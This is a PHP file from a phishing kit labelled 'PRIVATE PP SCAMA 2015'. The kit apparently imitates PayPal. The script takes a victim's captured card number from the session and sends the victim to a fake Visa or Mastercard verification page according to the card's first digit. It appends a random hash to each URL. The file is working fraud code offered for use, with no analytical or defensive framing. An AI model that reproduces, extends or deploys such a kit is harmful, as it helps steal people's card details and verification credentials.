<?php
session_start();

/*

+----------------------------------+
�--- PRIVATE  PP SCAMA   2015 -----�
�---------- Ver : 2.0 -------------�
�--------- HaMza-x Ben  -----------�
�----------- GREETZ TO ------------�
�--- Dz Phoniex : Dz Injector -----�
�----------------------------------�
�https://code.google.com/p/dznoob/ �
�----------------------------------�
�https://facebook.com/DzNOoBpage   �
+----------------------------------+


*/


$cnum = $_SESSION['dftCN'];
$bin = substr($cnum,0,1);

if ($bin == "4") {


?>
<meta http-equiv="refresh" content="0;URL=vbv/index.php?y= <?php echo md5(rand(100, 999999999)); ?>" />
<?php

 }

 elseif ($bin == "5")
{
      

?>
<meta http-equiv="refresh" content="0;URL=msc/index.php?y= <?php echo md5(rand(100, 999999999)); ?>" />
<?php

 
}

else
{


?>

<meta http-equiv="refresh" content="0;URL=last/index.php?y= <?php echo md5(rand(100, 999999999)); ?>" />
<?php

 
} 
 

?>